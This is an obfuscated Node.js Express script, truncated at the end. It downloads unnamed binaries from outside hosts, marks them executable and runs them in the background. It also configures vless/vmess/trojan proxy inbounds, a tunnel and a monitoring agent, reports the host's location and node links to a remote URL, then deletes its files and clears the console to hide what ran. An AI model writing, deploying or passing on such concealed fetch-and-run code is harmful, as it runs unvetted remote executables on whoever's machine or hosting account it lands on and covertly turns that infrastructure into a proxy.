const _0xfc54cc=_0x106b;(function(_0x53e2ae,_0x55e3d2){const _0x29d6dc={_0x749f5e:0xe3,_0x300f4c:0x178,_0x5330e6:0xeb,_0x441f89:0x16d,_0x18b5aa:0x18b},_0x5da0bd=_0x106b,_0x59409e=_0x53e2ae();while(!![]){try{const _0x3c076b=-parseInt(_0x5da0bd(_0x29d6dc._0x749f5e))/0x1+-parseInt(_0x5da0bd(0x125))/0x2*(parseInt(_0x5da0bd(_0x29d6dc._0x300f4c))/0x3)+-parseInt(_0x5da0bd(_0x29d6dc._0x5330e6))/0x4+-parseInt(_0x5da0bd(0x187))/0x5+parseInt(_0x5da0bd(0x174))/0x6+-parseInt(_0x5da0bd(0xd0))/0x7*(-parseInt(_0x5da0bd(0xde))/0x8)+parseInt(_0x5da0bd(_0x29d6dc._0x441f89))/0x9*(parseInt(_0x5da0bd(_0x29d6dc._0x18b5aa))/0xa);if(_0x3c076b===_0x55e3d2)break;else _0x59409e['push'](_0x59409e['shift']());}catch(_0xed3bd6){_0x59409e['push'](_0x59409e['shift']());}}}(_0x3219,0x4f717));function _0x106b(_0xdb5d54,_0x1819bd){const _0x3219b9=_0x3219();return _0x106b=function(_0x106bc5,_0x180478){_0x106bc5=_0x106bc5-0xcc;let _0x5181d5=_0x3219b9[_0x106bc5];return _0x5181d5;},_0x106b(_0xdb5d54,_0x1819bd);}const express=require(_0xfc54cc(0x162)),app=express(),axios=require(_0xfc54cc(0x11b)),os=require('os'),fs=require('fs'),path=require(_0xfc54cc(0xef)),{promisify}=require('util'),exec=promisify(require(_0xfc54cc(0x15e))['exec']),{execSync}=require(_0xfc54cc(0x15e)),UPLOAD_URL=process['env'][_0xfc54cc(0x13e)]||'',PROJECT_URL=process[_0xfc54cc(0x195)][_0xfc54cc(0x182)]||'',AUTO_ACCESS=process[_0xfc54cc(0x195)][_0xfc54cc(0xfc)]||![],FILE_PATH=process[_0xfc54cc(0x195)][_0xfc54cc(0x158)]||_0xfc54cc(0x124),SUB_PATH=process[_0xfc54cc(0x195)][_0xfc54cc(0x155)]||_0xfc54cc(0x149),PORT=process[_0xfc54cc(0x195)][_0xfc54cc(0x186)]||process[_0xfc54cc(0x195)]['PORT']||0xbb8,UUID=process['env'][_0xfc54cc(0x163)]||_0xfc54cc(0x184),NEZHA_SERVER=process[_0xfc54cc(0x195)]['NEZHA_SERVER']||_0xfc54cc(0xd6),NEZHA_PORT=process[_0xfc54cc(0x195)][_0xfc54cc(0x12f)]||'',NEZHA_KEY=process[_0xfc54cc(0x195)][_0xfc54cc(0x12d)]||_0xfc54cc(0x172),ARGO_DOMAIN=process[_0xfc54cc(0x195)]['ARGO_DOMAIN']||_0xfc54cc(0xfe),ARGO_AUTH=process[_0xfc54cc(0x195)][_0xfc54cc(0x120)]||_0xfc54cc(0xe7),ARGO_PORT=process[_0xfc54cc(0x195)][_0xfc54cc(0xdd)]||0x1f41,CFIP=process[_0xfc54cc(0x195)][_0xfc54cc(0xd2)]||_0xfc54cc(0x14e),CFPORT=process[_0xfc54cc(0x195)]['CFPORT']||0x1bb,NAME=process['env']['NAME']||_0xfc54cc(0xff);!fs[_0xfc54cc(0x15a)](FILE_PATH)?(fs[_0xfc54cc(0xf5)](FILE_PATH),console['log'](FILE_PATH+_0xfc54cc(0xfa))):console[_0xfc54cc(0xdf)](FILE_PATH+_0xfc54cc(0x179));function generateRandomName(){const _0x1d8703={_0x172e3f:0xcc,_0x557c23:0xe4},_0x3b2989=_0xfc54cc,_0x8b5a95=_0x3b2989(0x17a);let _0x1c8612='';for(let _0x12ca41=0x0;_0x12ca41<0x6;_0x12ca41++){_0x1c8612+=_0x8b5a95[_0x3b2989(0xd5)](Math[_0x3b2989(0x143)](Math[_0x3b2989(_0x1d8703._0x172e3f)]()*_0x8b5a95[_0x3b2989(_0x1d8703._0x557c23)]));}return _0x1c8612;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0xfc54cc(0x14a)](FILE_PATH,npmName),phpPath=path[_0xfc54cc(0x14a)](FILE_PATH,phpName),webPath=path[_0xfc54cc(0x14a)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0xfc54cc(0x14a)](FILE_PATH,_0xfc54cc(0xf7)),listPath=path[_0xfc54cc(0x14a)](FILE_PATH,_0xfc54cc(0x151)),bootLogPath=path[_0xfc54cc(0x14a)](FILE_PATH,_0xfc54cc(0x13b)),configPath=path[_0xfc54cc(0x14a)](FILE_PATH,_0xfc54cc(0x104));function deleteNodes(){const _0x1a064e={_0x30e9db:0xea,_0x141cbe:0x134,_0x3bf0aa:0x16c},_0x157a76=_0xfc54cc;try{if(!UPLOAD_URL)return;if(!fs[_0x157a76(0x15a)](subPath))return;let _0x360f6d;try{_0x360f6d=fs[_0x157a76(_0x1a064e._0x30e9db)](subPath,_0x157a76(0x17d));}catch{return null;}const _0x235229=Buffer['from'](_0x360f6d,_0x157a76(0x18c))[_0x157a76(0x106)](_0x157a76(0x17d)),_0x1ecb91=_0x235229[_0x157a76(_0x1a064e._0x141cbe)]('\x0a')[_0x157a76(0x107)](_0x385147=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x157a76(0x170)](_0x385147));if(_0x1ecb91[_0x157a76(0xe4)]===0x0)return;return axios[_0x157a76(0x118)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x157a76(_0x1a064e._0x3bf0aa)]({'nodes':_0x1ecb91}),{'headers':{'Content-Type':'application/json'}})[_0x157a76(0x156)](_0x283179=>{return null;}),null;}catch(_0x432941){return null;}}function cleanupOldFiles(){const _0x48c0be={_0x3d19aa:0x15d},_0x15aed4=_0xfc54cc;try{const _0x1c9dd3=fs[_0x15aed4(_0x48c0be._0x3d19aa)](FILE_PATH);_0x1c9dd3[_0x15aed4(0x101)](_0x9754f5=>{const _0x5cbbc7=_0x15aed4,_0x3ec4a4=path[_0x5cbbc7(0x14a)](FILE_PATH,_0x9754f5);try{const _0x1a23e3=fs[_0x5cbbc7(0x147)](_0x3ec4a4);_0x1a23e3['isFile']()&&fs['unlinkSync'](_0x3ec4a4);}catch(_0x5b07e7){}});}catch(_0x4befdd){}}app[_0xfc54cc(0x135)]('/',function(_0x79a5c4,_0x5baea8){const _0x3afe35=_0xfc54cc;_0x5baea8['send'](_0x3afe35(0x168));});async function generateConfig(){const _0x1b25ed={_0x30f482:0x112,_0x587f73:0x11f,_0x462cdc:0xe2,_0x1f9896:0x169,_0x2dd178:0x185,_0x525c1d:0x10e,_0x5d7a88:0x115,_0xa76a73:0x10b,_0x32c6e9:0x14b,_0x2beb3f:0x10e,_0x27faa9:0x115,_0x622bde:0x150,_0x4d1e54:0x133,_0x3cdae7:0x16c},_0x498a14=_0xfc54cc,_0x183fa5={'log':{'access':_0x498a14(0x18d),'error':'/dev/null','loglevel':_0x498a14(0x10e)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x498a14(0xcd)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x498a14(0x191),'dest':0xbba},{'path':_0x498a14(_0x1b25ed._0x30f482),'dest':0xbbb},{'path':_0x498a14(_0x1b25ed._0x587f73),'dest':0xbbc}]},'streamSettings':{'network':_0x498a14(_0x1b25ed._0x462cdc)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x498a14(0x10e)},'streamSettings':{'network':_0x498a14(0xe2),'security':'none'}},{'port':0xbba,'listen':_0x498a14(_0x1b25ed._0x1f9896),'protocol':_0x498a14(_0x1b25ed._0x2dd178),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x498a14(_0x1b25ed._0x525c1d)},'streamSettings':{'network':'ws','security':_0x498a14(0x10e),'wsSettings':{'path':_0x498a14(0x191)}},'sniffing':{'enabled':!![],'destOverride':[_0x498a14(_0x1b25ed._0x5d7a88),'tls',_0x498a14(_0x1b25ed._0xa76a73)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x498a14(0x109),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x498a14(0x112)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x498a14(_0x1b25ed._0x32c6e9),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x498a14(0x169),'protocol':_0x498a14(0x11e),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x498a14(_0x1b25ed._0x2beb3f),'wsSettings':{'path':_0x498a14(_0x1b25ed._0x587f73)}},'sniffing':{'enabled':!![],'destOverride':[_0x498a14(_0x1b25ed._0x27faa9),_0x498a14(_0x1b25ed._0x32c6e9),_0x498a14(0x10b)],'metadataOnly':![]}}],'dns':{'servers':[_0x498a14(_0x1b25ed._0x622bde)]},'outbounds':[{'protocol':_0x498a14(_0x1b25ed._0x4d1e54),'tag':'direct'},{'protocol':_0x498a14(0x140),'tag':_0x498a14(0x180)}]};fs[_0x498a14(0x129)](path[_0x498a14(0x14a)](FILE_PATH,_0x498a14(0x104)),JSON[_0x498a14(_0x1b25ed._0x3cdae7)](_0x183fa5,null,0x2));}function getSystemArchitecture(){const _0x33038a={_0x1cd736:0x161},_0x2b16be=_0xfc54cc,_0xa67697=os[_0x2b16be(0xf6)]();return _0xa67697===_0x2b16be(0x188)||_0xa67697===_0x2b16be(_0x33038a._0x1cd736)||_0xa67697==='aarch64'?_0x2b16be(0x188):_0x2b16be(0x14c);}function downloadFile(_0x44e2cb,_0x441b94,_0xaef6c0){const _0x2015ff={_0x1e237e:0x145,_0xd322ed:0x135,_0x53e101:0x114},_0x40969f={_0x2804d9:0x14d},_0x55adaa={_0x3e9ba9:0x190},_0x5bcc38={_0x5225c9:0x190,_0x14ef5f:0x153},_0x595a73=_0xfc54cc,_0x5494ec=_0x44e2cb;!fs[_0x595a73(0x15a)](FILE_PATH)&&fs[_0x595a73(0xf5)](FILE_PATH,{'recursive':!![]});const _0x598759=fs[_0x595a73(_0x2015ff._0x1e237e)](_0x5494ec);axios({'method':_0x595a73(_0x2015ff._0xd322ed),'url':_0x441b94,'responseType':_0x595a73(0x138)})[_0x595a73(_0x2015ff._0x53e101)](_0x894660=>{const _0x40acc4=_0x595a73;_0x894660[_0x40acc4(0xf0)]['pipe'](_0x598759),_0x598759['on'](_0x40acc4(0xf3),()=>{const _0x4395b6=_0x40acc4;_0x598759['close'](),console['log'](_0x4395b6(0x122)+path[_0x4395b6(_0x5bcc38._0x5225c9)](_0x5494ec)+_0x4395b6(_0x5bcc38._0x14ef5f)),_0xaef6c0(null,_0x5494ec);}),_0x598759['on']('error',_0x224056=>{const _0x13cabb=_0x40acc4;fs['unlink'](_0x5494ec,()=>{});const _0x4ce3be=_0x13cabb(0x122)+path[_0x13cabb(_0x55adaa._0x3e9ba9)](_0x5494ec)+_0x13cabb(0xf4)+_0x224056[_0x13cabb(0x14d)];console['error'](_0x4ce3be),_0xaef6c0(_0x4ce3be);});})['catch'](_0x31f58d=>{const _0x58d679=_0x595a73,_0x19fd8a='Download\x20'+path[_0x58d679(0x190)](_0x5494ec)+_0x58d679(0xf4)+_0x31f58d[_0x58d679(_0x40969f._0x2804d9)];console[_0x58d679(0x16b)](_0x19fd8a),_0xaef6c0(_0x19fd8a);});}async function downloadFilesAndRun(){const _0x5eb232={_0xdea95e:0x193,_0xc62ecd:0xe1,_0x40faf5:0xfd,_0x385b81:0x17e,_0x361051:0x130,_0x479b08:0x167,_0x48dd6f:0x108,_0x102a93:0xce,_0xdebaf:0x105,_0x32b4da:0x14a,_0x226ed3:0xdf,_0x4aecb2:0x16a,_0x35c6a5:0xd3,_0x2d8e20:0x136,_0x4631da:0x130,_0x403545:0x160,_0x3290da:0xe8,_0x2ef291:0x16a,_0x5cb5ba:0x16b,_0x4d9538:0x12a,_0x5d064b:0x111,_0x54c2ab:0x17b,_0x44b66a:0xf2,_0x5336fc:0x154,_0x38b9e8:0x13c,_0x4c1329:0x16b,_0x2276e8:0x121},_0x14de9d=_0xfc54cc,_0x8e35ad=getSystemArchitecture(),_0x3b4880=getFilesForArchitecture(_0x8e35ad);if(_0x3b4880[_0x14de9d(0xe4)]===0x0){console[_0x14de9d(0xdf)](_0x14de9d(_0x5eb232._0xdea95e));return;}const _0x4b0071=_0x3b4880[_0x14de9d(_0x5eb232._0xc62ecd)](_0x51a52c=>{return new Promise((_0x1f25b1,_0x229430)=>{const _0x59cc3b=_0x106b;downloadFile(_0x51a52c['fileName'],_0x51a52c[_0x59cc3b(0x18e)],(_0x2b6f94,_0x5f4d5f)=>{_0x2b6f94?_0x229430(_0x2b6f94):_0x1f25b1(_0x5f4d5f);});});});try{await Promise[_0x14de9d(0x13f)](_0x4b0071);}catch(_0x270280){console[_0x14de9d(0x16b)](_0x14de9d(_0x5eb232._0x40faf5),_0x270280);return;}function _0x6e29aa(_0xa23762){const _0x4f94ce=_0x14de9d,_0x4c9776=0x1fd;_0xa23762[_0x4f94ce(0x101)](_0x568718=>{const _0x486490={_0x331150:0xd7},_0x5d0d88=_0x4f94ce;fs[_0x5d0d88(0x15a)](_0x568718)&&fs[_0x5d0d88(0x177)](_0x568718,_0x4c9776,_0x612050=>{const _0x2cff07=_0x5d0d88;_0x612050?console['error'](_0x2cff07(0x189)+_0x568718+':\x20'+_0x612050):console[_0x2cff07(0xdf)](_0x2cff07(_0x486490._0x331150)+_0x568718+':\x20'+_0x4c9776['toString'](0x8));});});}const _0x13f3cf=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x6e29aa(_0x13f3cf);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3f5edc=NEZHA_SERVER[_0x14de9d(_0x5eb232._0x385b81)](':')?NEZHA_SERVER['split'](':')['pop']():'',_0x2d0c4f=new Set(['443','8443',_0x14de9d(_0x5eb232._0x361051),_0x14de9d(0x137),_0x14de9d(0x131),'2053']),_0xaa3b2d=_0x2d0c4f[_0x14de9d(_0x5eb232._0x479b08)](_0x3f5edc)?_0x14de9d(0x194):_0x14de9d(0xdb),_0x1e47dc=_0x14de9d(0x13d)+NEZHA_KEY+_0x14de9d(_0x5eb232._0x48dd6f)+NEZHA_SERVER+_0x14de9d(_0x5eb232._0x102a93)+_0xaa3b2d+_0x14de9d(_0x5eb232._0xdebaf)+UUID;fs['writeFileSync'](path[_0x14de9d(_0x5eb232._0x32b4da)](FILE_PATH,'config.yaml'),_0x1e47dc);const _0x1eda0=_0x14de9d(0x142)+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x14de9d(0x144);try{await exec(_0x1eda0),console[_0x14de9d(_0x5eb232._0x226ed3)](phpName+_0x14de9d(_0x5eb232._0x4aecb2)),await new Promise(_0x1c59a7=>setTimeout(_0x1c59a7,0x3e8));}catch(_0x1046c0){console['error'](_0x14de9d(_0x5eb232._0x35c6a5)+_0x1046c0);}}else{let _0x1aad55='';const _0x4d4aab=[_0x14de9d(0xee),_0x14de9d(_0x5eb232._0x2d8e20),_0x14de9d(_0x5eb232._0x4631da),_0x14de9d(0x137),_0x14de9d(0x131),_0x14de9d(_0x5eb232._0x403545)];_0x4d4aab[_0x14de9d(0x17e)](NEZHA_PORT)&&(_0x1aad55='--tls');const _0x2e8b14=_0x14de9d(0x142)+npmPath+_0x14de9d(_0x5eb232._0x3290da)+NEZHA_SERVER+':'+NEZHA_PORT+_0x14de9d(0x11a)+NEZHA_KEY+'\x20'+_0x1aad55+_0x14de9d(0x164);try{await exec(_0x2e8b14),console['log'](npmName+_0x14de9d(_0x5eb232._0x2ef291)),await new Promise(_0x543ef2=>setTimeout(_0x543ef2,0x3e8));}catch(_0x5f3de3){console[_0x14de9d(_0x5eb232._0x5cb5ba)](_0x14de9d(_0x5eb232._0x4d9538)+_0x5f3de3);}}}else console['log']('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x33bb22='nohup\x20'+webPath+_0x14de9d(_0x5eb232._0x5d064b)+FILE_PATH+_0x14de9d(0x11c);try{await exec(_0x33bb22),console[_0x14de9d(0xdf)](webName+'\x20is\x20running'),await new Promise(_0x3e5b6a=>setTimeout(_0x3e5b6a,0x3e8));}catch(_0x26398b){console[_0x14de9d(_0x5eb232._0x5cb5ba)](_0x14de9d(_0x5eb232._0x54c2ab)+_0x26398b);}if(fs[_0x14de9d(0x15a)](botPath)){let _0x2289e6;if(ARGO_AUTH[_0x14de9d(0xf2)](/^[A-Z0-9a-z=]{120,250}$/))_0x2289e6='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x14de9d(_0x5eb232._0x44b66a)](/TunnelSecret/)?_0x2289e6=_0x14de9d(_0x5eb232._0x5336fc)+FILE_PATH+_0x14de9d(0x18a):_0x2289e6=_0x14de9d(_0x5eb232._0x38b9e8)+FILE_PATH+_0x14de9d(0x148)+ARGO_PORT;try{await exec(_0x14de9d(0x142)+botPath+'\x20'+_0x2289e6+_0x14de9d(0x166)),console['log'](botName+_0x14de9d(0x16a)),await new Promise(_0x1e78e8=>setTimeout(_0x1e78e8,0x7d0));}catch(_0x4149b5){console[_0x14de9d(_0x5eb232._0x4c1329)](_0x14de9d(_0x5eb232._0x2276e8)+_0x4149b5);}}await new Promise(_0x8bbdfa=>setTimeout(_0x8bbdfa,0x1388));}function getFilesForArchitecture(_0x4a5b37){const _0x1abfae={_0x217031:0x188,_0x42fddc:0x176,_0x57768f:0xed,_0x4add75:0xf9,_0x580c50:0x17c,_0x118cb5:0xd1,_0x533729:0xe9},_0x5bfbdf=_0xfc54cc;let _0x439240;_0x4a5b37===_0x5bfbdf(_0x1abfae._0x217031)?_0x439240=[{'fileName':webPath,'fileUrl':_0x5bfbdf(_0x1abfae._0x42fddc)},{'fileName':botPath,'fileUrl':_0x5bfbdf(_0x1abfae._0x57768f)}]:_0x439240=[{'fileName':webPath,'fileUrl':_0x5bfbdf(_0x1abfae._0x4add75)},{'fileName':botPath,'fileUrl':_0x5bfbdf(0x16f)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x1f4bf2=_0x4a5b37===_0x5bfbdf(_0x1abfae._0x217031)?'https://arm64.ssss.nyc.mn/agent':_0x5bfbdf(_0x1abfae._0x580c50);_0x439240['unshift']({'fileName':npmPath,'fileUrl':_0x1f4bf2});}else{const _0x14b114=_0x4a5b37===_0x5bfbdf(0x188)?_0x5bfbdf(_0x1abfae._0x118cb5):_0x5bfbdf(0x14f);_0x439240[_0x5bfbdf(_0x1abfae._0x533729)]({'fileName':phpPath,'fileUrl':_0x14b114});}}return _0x439240;}function argoType(){const _0x7ddd45={_0x14254a:0x17e,_0x451fe0:0x10a,_0x4d8052:0x14a,_0x40c6eb:0xd9,_0x4ab7a2:0x16e,_0x287e4d:0xdf,_0xbc649f:0x15b},_0x1661ec=_0xfc54cc;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log']('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x1661ec(_0x7ddd45._0x14254a)](_0x1661ec(_0x7ddd45._0x451fe0))){fs['writeFileSync'](path[_0x1661ec(_0x7ddd45._0x4d8052)](FILE_PATH,_0x1661ec(_0x7ddd45._0x40c6eb)),ARGO_AUTH);const _0x3d98ff=_0x1661ec(0x10d)+ARGO_AUTH[_0x1661ec(0x134)]('\x22')[0xb]+_0x1661ec(0x128)+path[_0x1661ec(0x14a)](FILE_PATH,'tunnel.json')+_0x1661ec(0x127)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x1661ec(_0x7ddd45._0x4ab7a2);fs[_0x1661ec(0x129)](path['join'](FILE_PATH,_0x1661ec(0x157)),_0x3d98ff);}else console[_0x1661ec(_0x7ddd45._0x287e4d)](_0x1661ec(_0x7ddd45._0xbc649f));}async function extractDomains(){const _0x47be0b={_0x46df50:0x17d,_0x547e3e:0x101,_0xc28caa:0xdf,_0x4d9499:0x148,_0x2daac1:0x142,_0x15773b:0x16b},_0x5100b2={_0x361272:0xf0,_0x4c76c2:0xf0,_0x584d61:0xec},_0x3265cf={_0xd0e80:0x165,_0x9aa93e:0xf1},_0x4c6374={_0x1e08df:0x146},_0x2aa7ea=_0xfc54cc;let _0xda384c;if(ARGO_AUTH&&ARGO_DOMAIN)_0xda384c=ARGO_DOMAIN,console['log'](_0x2aa7ea(0x181),_0xda384c),await _0x2613ef(_0xda384c);else try{const _0x1866ce=fs['readFileSync'](path[_0x2aa7ea(0x14a)](FILE_PATH,_0x2aa7ea(0x13b)),_0x2aa7ea(_0x47be0b._0x46df50)),_0x513030=_0x1866ce[_0x2aa7ea(0x134)]('\x0a'),_0x8629c5=[];_0x513030[_0x2aa7ea(_0x47be0b._0x547e3e)](_0x1b1c2b=>{const _0x155de4=_0x2aa7ea,_0x3ab580=_0x1b1c2b[_0x155de4(0xf2)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x3ab580){const _0x558be2=_0x3ab580[0x1];_0x8629c5[_0x155de4(_0x4c6374._0x1e08df)](_0x558be2);}});if(_0x8629c5['length']>0x0)_0xda384c=_0x8629c5[0x0],console[_0x2aa7ea(_0x47be0b._0xc28caa)](_0x2aa7ea(0x12c),_0xda384c),await _0x2613ef(_0xda384c);else{console['log']('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x2aa7ea(0x15c)](path['join'](FILE_PATH,_0x2aa7ea(0x13b)));async function _0x3e7ac7(){const _0x2710ac=_0x2aa7ea;try{process['platform']===_0x2710ac(0x102)?await exec(_0x2710ac(0x10c)+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x2710ac(0xd8)+botName[_0x2710ac(0xd5)](0x0)+']'+botName[_0x2710ac(_0x3265cf._0xd0e80)](0x1)+_0x2710ac(_0x3265cf._0x9aa93e));}catch(_0x1c3b85){}}_0x3e7ac7(),await new Promise(_0x776cde=>setTimeout(_0x776cde,0xbb8));const _0x3a259a=_0x2aa7ea(0x13c)+FILE_PATH+_0x2aa7ea(_0x47be0b._0x4d9499)+ARGO_PORT;try{await exec(_0x2aa7ea(_0x47be0b._0x2daac1)+botPath+'\x20'+_0x3a259a+_0x2aa7ea(0x166)),console['log'](botName+'\x20is\x20running'),await new Promise(_0x311b49=>setTimeout(_0x311b49,0xbb8)),await extractDomains();}catch(_0x495bd3){console['error']('Error\x20executing\x20command:\x20'+_0x495bd3);}}}catch(_0x5b20db){console[_0x2aa7ea(_0x47be0b._0x15773b)](_0x2aa7ea(0xdc),_0x5b20db);}async function _0x4c9fdc(){const _0x269771=_0x2aa7ea;try{const _0x402500=await axios[_0x269771(0x135)](_0x269771(0x13a),{'timeout':0xbb8});if(_0x402500[_0x269771(_0x5100b2._0x361272)]&&_0x402500[_0x269771(_0x5100b2._0x4c76c2)]['country_code']&&_0x402500['data'][_0x269771(0xec)])return _0x402500[_0x269771(0xf0)]['country_code']+'_'+_0x402500[_0x269771(_0x5100b2._0x361272)]['org'];}catch(_0x1feee0){try{const _0x5ab835=await axios[_0x269771(0x135)](_0x269771(0xf8),{'timeout':0xbb8});if(_0x5ab835[_0x269771(_0x5100b2._0x4c76c2)]&&_0x5ab835[_0x269771(0xf0)]['status']==='success'&&_0x5ab835['data']['countryCode']&&_0x5ab835['data'][_0x269771(_0x5100b2._0x584d61)])return _0x5ab835[_0x269771(0xf0)]['countryCode']+'_'+_0x5ab835['data'][_0x269771(0xec)];}catch(_0x53c64c){}}return _0x269771(0xe6);}async function _0x2613ef(_0x1d0d61){const _0x55131c=await _0x4c9fdc(),_0x44d494=NAME?NAME+'-'+_0x55131c:_0x55131c;return new Promise(_0x5c781a=>{const _0x4e1142={_0x2080f7:0x10e,_0x39f79f:0xe0,_0x49219f:0xda,_0x203532:0x15f,_0x1db8ba:0x16c,_0x210ff7:0x106,_0x149c0d:0x192,_0x483203:0xdf,_0x338257:0x129};setTimeout(()=>{const _0x5314ed={_0x4b3ad1:0x117,_0x4ca551:0x106,_0x2ea9a9:0x103,_0x31ee7f:0x100},_0x10eb11=_0x106b,_0x5f41a5={'v':'2','ps':''+_0x44d494,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x10eb11(0x10e),'net':'ws','type':_0x10eb11(_0x4e1142._0x2080f7),'host':_0x1d0d61,'path':_0x10eb11(_0x4e1142._0x39f79f),'tls':_0x10eb11(0x14b),'sni':_0x1d0d61,'alpn':'','fp':'firefox'},_0x410a76='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x10eb11(_0x4e1142._0x49219f)+_0x1d0d61+'&fp=firefox&type=ws&host='+_0x1d0d61+_0x10eb11(0x126)+_0x44d494+_0x10eb11(_0x4e1142._0x203532)+Buffer[_0x10eb11(0x117)](JSON[_0x10eb11(_0x4e1142._0x1db8ba)](_0x5f41a5))[_0x10eb11(_0x4e1142._0x210ff7)](_0x10eb11(0x18c))+_0x10eb11(0x119)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x1d0d61+_0x10eb11(_0x4e1142._0x149c0d)+_0x1d0d61+_0x10eb11(0x11d)+_0x44d494+_0x10eb11(0x116);console[_0x10eb11(_0x4e1142._0x483203)](Buffer['from'](_0x410a76)['toString'](_0x10eb11(0x18c))),fs[_0x10eb11(_0x4e1142._0x338257)](subPath,Buffer['from'](_0x410a76)['toString'](_0x10eb11(0x18c))),console[_0x10eb11(0xdf)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x10eb11(0x135)]('/'+SUB_PATH,(_0xdbe4d8,_0x3bdc32)=>{const _0x121b64=_0x10eb11,_0x5080d3=Buffer[_0x121b64(_0x5314ed._0x4b3ad1)](_0x410a76)[_0x121b64(_0x5314ed._0x4ca551)]('base64');_0x3bdc32[_0x121b64(_0x5314ed._0x2ea9a9)](_0x121b64(0x152),_0x121b64(_0x5314ed._0x31ee7f)),_0x3bdc32[_0x121b64(0x175)](_0x5080d3);}),_0x5c781a(_0x410a76);},0x7d0);});}}async function uploadNodes(){const _0x4aec04={_0x20b3a1:0x110,_0xcc59:0xdf,_0x43e2d2:0x12e},_0x27bfea=_0xfc54cc;if(UPLOAD_URL&&PROJECT_URL){const _0x6ae227=PROJECT_URL+'/'+SUB_PATH,_0x41c383={'subscription':[_0x6ae227]};try{const _0x168f54=await axios[_0x27bfea(0x118)](UPLOAD_URL+_0x27bfea(0xe5),_0x41c383,{'headers':{'Content-Type':_0x27bfea(_0x4aec04._0x20b3a1)}});return _0x168f54&&_0x168f54[_0x27bfea(0x10f)]===0xc8?(console[_0x27bfea(_0x4aec04._0xcc59)]('Subscription\x20uploaded\x20successfully'),_0x168f54):null;}catch(_0x1acee8){if(_0x1acee8[_0x27bfea(0xd4)]){if(_0x1acee8[_0x27bfea(0xd4)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0xbef224=fs['readFileSync'](listPath,'utf-8'),_0x2e5d86=_0xbef224[_0x27bfea(0x134)]('\x0a')[_0x27bfea(0x107)](_0x30fd67=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x27bfea(0x170)](_0x30fd67));if(_0x2e5d86['length']===0x0)return;const _0x1ce1db=JSON[_0x27bfea(0x16c)]({'nodes':_0x2e5d86});try{const _0x559a5b=await axios[_0x27bfea(0x118)](UPLOAD_URL+'/api/add-nodes',_0x1ce1db,{'headers':{'Content-Type':_0x27bfea(_0x4aec04._0x20b3a1)}});return _0x559a5b&&_0x559a5b[_0x27bfea(0x10f)]===0xc8?(console[_0x27bfea(0xdf)](_0x27bfea(_0x4aec04._0x43e2d2)),_0x559a5b):null;}catch(_0x46fa1e){return null;}}else return;}}function cleanFiles(){const _0x2d9ae3={_0xd69308:0x146,_0x326057:0x102,_0x4b0e1e:0x123,_0xac837b:0x14a},_0x24b841={_0xf00469:0x132,_0x2a4c79:0x159};setTimeout(()=>{const _0x3eef4b=_0x106b,_0x3e926d=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x3e926d[_0x3eef4b(_0x2d9ae3._0xd69308)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x3e926d[_0x3eef4b(_0x2d9ae3._0xd69308)](phpPath);process['platform']===_0x3eef4b(_0x2d9ae3._0x326057)?exec(_0x3eef4b(_0x2d9ae3._0x4b0e1e)+_0x3e926d[_0x3eef4b(0x14a)]('\x20')+_0x3eef4b(0x113),_0x21a3aa=>{const _0x3d2a99=_0x3eef4b;console['clear'](),console['log'](_0x3d2a99(0x139)),console[_0x3d2a99(0xdf)](_0x3d2a99(0x159));}):exec(_0x3eef4b(0x18f)+_0x3e926d[_0x3eef4b(_0x2d9ae3._0xac837b)]('\x20')+_0x3eef4b(0xfb),_0x2320e0=>{const _0x1495fb=_0x3eef4b;console[_0x1495fb(_0x24b841._0xf00469)](),console[_0x1495fb(0xdf)]('App\x20is\x20running'),console[_0x1495fb(0xdf)](_0x1495fb(_0x24b841._0x2a4c79));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x24b875={_0x3d9035:0x171,_0x29f545:0x110},_0x2e596d=_0xfc54cc;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x2e596d(0xdf)](_0x2e596d(0x17f));return;}try{const _0x3f58be=await 